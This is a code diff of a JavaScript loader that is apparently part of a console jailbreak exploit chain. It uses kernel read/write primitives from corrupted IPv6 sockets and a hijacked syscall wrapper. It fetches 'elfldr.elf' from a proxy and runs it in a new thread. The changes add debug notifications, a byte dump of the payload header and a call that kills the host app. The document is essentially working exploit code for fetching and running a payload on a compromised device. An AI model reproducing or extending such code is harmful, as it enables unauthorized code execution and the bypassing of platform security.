@@ -137,7 +137,7 @@ async function elf_parse(elf_store) {
     return elf_entry_point;
 }
 
-async function elf_run(elf_entry_point, payloadout) {
+async function elf_run(elf_entry_point) {
     logger.flush();
     const rwpipe = malloc(8);
     const rwpair = malloc(8);
@@ -150,7 +150,7 @@ async function elf_run(elf_entry_point, payloadout) {
     write32_uncompressed(rwpair, ipv6_kernel_rw.data.master_sock);
     write32_uncompressed(rwpair + 0x4n, ipv6_kernel_rw.data.victim_sock);
     
-    //const payloadout = malloc(4);
+    const payloadout = malloc(4);
     
     // We are reusing syscall_wrapper from gettimeofdayAddr
     write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);                  // arg1 = syscall wrapper
@@ -162,30 +162,44 @@ async function elf_run(elf_entry_point, payloadout) {
     
     // Spawn elf in new thread
     const ret = call(Thrd_create, thr_handle_addr, elf_entry_point, args);
+    if(ret != 0n){
+	send_notification("Thrd_create failed, ret = " + String(hex(ret)));
+	logger.log("Thrd_create failed, ret = " + hex(ret));
+    	logger.flush();
+    	throw new Error("Thrd_create() error: " + hex(ret));
+
+	}
 
     /* Blocking Gibbon's thread until elfldr finishes */
-    let step = 0;
-    while (step < 200000000) {
-        step++;
-    }
-
+    await sleep(500); 
+    
     if (ret !== 0n) {
         throw new Error("Thrd_create() error: " + hex(ret));
     }
 
     const thr_handle = read64_uncompressed(thr_handle_addr);
 
-    return thr_handle;
+    return {thr_handle, payloadout };
 }
 
+
+function notify_elf_magic(ptr) {
+    let mags = [];
+    for (let i = 0; i < 45; i++) {
+        mags.push(read8_uncompressed(ptr + BigInt(i)).toString(16).padStart(2,"0"));
+    }
+    send_notification("ELF DUMP 45 bytes: \n" + mags.join(" "));
+}
 async function elf_wait_for_exit(thr_handle, payloadout) {
     // Will block until elf terminates
     const ret = call(Thrd_join, thr_handle, 0n);
     if (ret !== 0n) {
+        send_notification("Thrd_join() error: " + hex(ret));
         throw new Error("Thrd_join() error: " + hex(ret));
     }
     
     const out = read32_uncompressed(payloadout);
+    send_notification("out: " + hex(out));
     logger.log("out = " + hex(out));
     logger.flush();
 }
@@ -199,29 +213,36 @@ async function elf_loader() {
     try {
 
         check_jailbroken();
-
+        send_notification("elf_loader.js loaded!");
+        
         logger.log("Loading elfldr.elf from proxy");
         logger.flush();
 
         const elf_data = malloc(400*1024);
         let elf_size = fetch_file("elfldr.elf", elf_data);
-
+        
+        send_notification("elfldr.elf received size:" + String(elf_size));
         if(elf_size < 1000) {
             throw new Error("Something went wrong while reading elfldr.elf");
         }
-        const elf_entry_point = await elf_parse(elf_data); // We pass the buffer pointer directly
-
-        const payloadout = malloc(4);
-        const thr_handle = await elf_run(elf_entry_point, payloadout);
-
-        await elf_wait_for_exit(thr_handle, payloadout);
         
+        notify_elf_magic(elf_data);
+	
+        const elf_entry_point = await elf_parse(elf_data); // We pass the buffer pointer directly
+        
+        const {thr_handle, payloadout} = await elf_run(elf_entry_point);
+        
+
+        //await elf_wait_for_exit(thr_handle, payloadout);
+        await sleep(500); 
         logger.log("Done");
         logger.flush();
-
+        kill_nf();
 
     } catch (e) {
         logger.log("Error: " + e.message);
+        logger.flush();
+        send_notification("Error: " + e.message);
         throw e;
     }
 }
